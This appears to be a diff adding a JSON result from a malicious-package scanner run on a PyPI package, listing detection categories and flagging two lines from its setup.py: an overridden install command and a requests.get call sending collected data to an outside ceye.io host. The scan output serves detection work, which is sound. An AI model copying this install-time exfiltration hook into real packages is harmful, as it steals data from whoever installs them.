@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:19",
+                "code": "setup(name='antchain_sdk_goodschain', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "code-execution": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:16",
+                "code": "        requests.get(\"http://5r13v9.ceye.io\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "shady-links": {},
+        "steganography": {},
+        "obfuscation": {},
+        "exec-base64": {},
+        "dll-hijacking": {}
+    },
+    "path": "./dataset/pypi/antchain_sdk_goodschain-1.0.0"
+}
